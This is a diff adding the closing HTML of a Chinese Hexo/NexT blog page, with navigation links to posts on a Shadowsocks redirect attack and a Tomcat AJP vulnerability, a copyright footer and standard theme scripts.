+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/02/29/Shadowsocks%E5%8D%8F%E8%AE%AE%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/" rel="prev" title="Shadowsocks协议重定向攻击">
+                  <i class="fa fa-angle-left"></i> Shadowsocks协议重定向攻击
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/03/26/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/" rel="next" title="Tomcat Ajp协议漏洞">
+                  Tomcat Ajp协议漏洞 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">淚笑</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
